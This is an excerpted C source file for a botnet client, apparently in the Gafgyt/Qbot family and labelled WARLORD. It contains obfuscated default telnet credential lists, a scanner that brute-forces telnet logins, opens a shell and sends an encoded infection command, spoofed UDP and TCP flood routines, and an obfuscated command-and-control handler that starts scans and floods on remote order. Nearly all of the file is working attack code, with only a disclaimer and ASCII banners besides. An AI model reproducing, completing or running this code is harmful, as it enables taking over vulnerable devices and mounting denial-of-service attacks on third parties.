...
I am not responsible for the damage caused
*/
...
char *infect = "?=STzDwSZS?=STD\"zSZS?=STu*UTUv\"Z^vxs^!qSz(zwS>l:X>>$X@@$X>l.SW?S|)zSz(zwXxASZSz(zwS>l:X>>$X@@$X>l.SW?S|)zSz(zwXxAZxASz(zwXxAZ^vxs^!qSz(zwSWUSz(zw@XxASW|S>l:X>>$X@@$X>l.SZSz(zwSWUSz(zw@XxASW|S>l:X>>$X@@$X>l.ZxASz(zw@XxAZ^vxs^!qSr|)zSAzzw1TT>l:X>>$X@@$X>l.T|z!wXxASZSr|)zSAzzw1TT>l:X>>$X@@$X>l.T|z!wXxAZ?AD!=SqS|z!wXxASZS^vxs^!qS?AD!=SqS|z!wXxAZxAS|z!wXxA";
...
char *usernames[] = {"U!!zVGO", "*=DB\"VGO", "|v)xzVGO", "xvww!UzVGO", "\")z|)*UVGO", "v^\"zVGO", "?Bx?!VGO", "vx)UVGO", "z!!UVGO", "zBDVGO", "mfnC4VGO", "mWcB\"%VGO"};
char *passwords[] = {"VGO", "U!!zVGO", "*=DB\"VGO", "*=DB\"VGO", ">@o$VGOVGO", "?A*\"|)D)VGO", "|v)xzVGO", "=)(*v;zVGO", "w*xxVGO", "w*xxr!U=VGO", "?Bx?!VGO", "\")z|)*UVGO", ";!|B\"VGO", "zBDVGO", "mfnC4VGO", "mWcB\"%VGO"};
...
void Scanner()
{
	...
	while(1)
	{
		for(i = 0; i < max; i++)
		{
			...
			case 2:
				{
					...
					if(readUntil(fds[i].fd, decode("!|B\""), 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed)) //login
					{
						fds[i].totalTimeout = 0;
						fds[i].bufUsed = 0;
						memset(fds[i].sockbuf, 0, 1024); 
			...
			case 4:
				{
					...
					if(readUntil(fds[i].fd, decode("*xxr!U="), 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed)) //password
					{
						fds[i].totalTimeout = 0;
						fds[i].bufUsed = 0;
						if(strstr(fds[i].sockbuf, decode("*xxr!U=")) != NULL) fds[i].state = 5; //password
						else fds[i].state = 7;
						memset(fds[i].sockbuf, 0, 1024);
						continue;
					} else {
						if(strstr(fds[i].sockbuf, decode("!|B\"")) != NULL) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; } //login
						fds[i].bufUsed = strlen(fds[i].sockbuf);
					}
			...
			case 6:
				{
					...
					if(readUntil(fds[i].fd, decode("!|B\""), 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed)) //login
					{
						fds[i].totalTimeout = 0;
						fds[i].bufUsed = 0;
						if(strstr(fds[i].sockbuf, decode("!|B\"")) != NULL) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; } //login
			...
			case 7:
				{
					if(send(fds[i].fd, decode("xAVG"), 4, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; } //sh
                    if(send(fds[i].fd, decode("xA);;VG"), 7, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; } //shell
					fds[i].state = 8;
				}
				break;
			...
			case 8:
				{
					if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);
					if(send(fds[i].fd, decode(infect), strlen(infect), MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; memset(fds[i].sockbuf, 0, 1024); continue; }
...
void sendUDP(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
        ...
        if(spoofit == 32)
        {
                ...
                Rasputin(iph, dest_addr.sin_addr.s_addr, htonl( windowsDefender(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
                ...
                winhost((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
...
void sendTCP(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
{
        ...
        Rasputin(iph, dest_addr.sin_addr.s_addr, htonl( windowsDefender(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);
        ...
        if(!strcmp(flags, "all")) //all
        {
                ...
                while(pch)
                {
                        if(!strcmp(pch,         "syn")) //syn
                        {
                                tcph->syn = 1;
                        } else if(!strcmp(pch,  "rst")) //rst
                        {
                                tcph->rst = 1;
                        } else if(!strcmp(pch,  "fin")) //fin
                        {
                                tcph->fin = 1;
                        } else if(!strcmp(pch,  "ack")) //ack
                        {
                                tcph->ack = 1;
                        } else if(!strcmp(pch,  "psh")) //psh
                        {
                                tcph->psh = 1;
                        } else {
...
/*  __  ______  __    ____     ________    ____  ____  ____ 
   / / / / __ \/ /   / __ \   / ____/ /   / __ \/ __ \/ __ \
  / /_/ / / / / /   / / / /  / /_  / /   / / / / / / / / / /
 / __  / /_/ / /___/ /_/ /  / __/ / /___/ /_/ / /_/ / /_/ / 
/_/ /_/\____/_____/_____/  /_/   /_____/\____/\____/_____/ 
*/
...
/*     ____  ___   ____ __    ________    ____  ____  ____ 
      / / / / / | / / //_/   / ____/ /   / __ \/ __ \/ __ \
 __  / / / / /  |/ / ,<     / /_  / /   / / / / / / / / / /
/ /_/ / /_/ / /|  / /| |   / __/ / /___/ /_/ / /_/ / /_/ / 
\____/\____/_/ |_/_/ |_|  /_/   /_____/\____/\____/_____/ 
*/
...
{   
	  if(!strcmp(argv[0], "Kfah")) //PING
	  {     
		sockprintf(mainCommSock, "K~ahN"); //PONG!
		return;
	  }
    //Scanner
	  if(!strcmp(argv[0], "4npaa-3"))
	  {
		    ...
		    if(!strcmp(argv[1], "~ii")) //OFF
	    	{
	      		if(scanPid == 0) return;
		       	kill(scanPid, 9);
		      	scanPid = 0;
     	  }
		    if(!strcmp(argv[1], "~a")) //ON
		    {
		      	if(scanPid != 0) return;
			      uint32_t parent;
			      parent = fork();
        ...
        if(!strcmp(argv[0], "g~cm")) //HOLD
        {
                if(argc < 4 || atoi(decode(argv[2])) < 1 || atoi(decode(argv[3])) < 1)
                {
        ...
        if(!strcmp(argv[0], "6mK")) //UDP
        {
                if(argc < 6 || atoi(decode(argv[3])) == -1 || atoi(decode(argv[2])) == -1 || atoi(decode(argv[4])) == -1 || atoi(decode(argv[5])) == -1 || atoi(decode(argv[5])) > 65500 || atoi(decode(argv[4])) > 32 || (argc == 7 && atoi(decode(argv[6])) < 1))
                {
                ...
                int port = atoi(decode(argv[2]));
                int time = atoi(decode(argv[3]));
                int spoofed = atoi(decode(argv[4]));
                int packetsize = atoi(decode(argv[5]));
                int pollinterval = (argc == 7 ? atoi(decode(argv[6])) : 10);

                if(strstr(ip, ",") != NULL)
                {
                        //sockprintf(mainCommSock, encode, "UDP Flooding %s for %d seconds.", ip, time);
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!winFork())
                        ...
                        //sockprintf(mainCommSock, encode, "UDP Flooding %s:%d for %d seconds.", ip, port, time);
                        sendUDP(ip, port, time, spoofed, packetsize, pollinterval);
                        _exit(0);
                }
        } 
        if(!strcmp(argv[0], "5nK")) //TCP
        {
                if(argc < 6 || atoi(decode(argv[3])) == -1 || atoi(decode(argv[2])) == -1 || atoi(decode(argv[4])) == -1 || atoi(decode(argv[4])) > 32 || (argc > 6 && atoi(decode(argv[6])) < 0) || (argc == 8 && atoi(decode(argv[7])) < 1))
                {
                ...
                int time = atoi(decode(argv[3]));
                int spoofed = atoi(decode(argv[4]));
                unsigned char *flags = decode(argv[5]);

                int pollinterval = argc == 8 ? atoi(decode(argv[7])) : 10;
                int psize = argc > 6 ? atoi(decode(argv[6])) : 0;
  ...
  if(!strcmp(argv[0], "45~K")) //STOP
  {
	...
	if(!strcmp(argv[0], "c~ca~h5i~")) //LOLNOGTFO
	{
		exit(0);
	}
}
...
int main(int argc, unsigned char *argv[])
{
	...
	while(1)
	{
		...
		sockprintf(mainCommSock, "WARLORD"); //Gotta confirm dem build
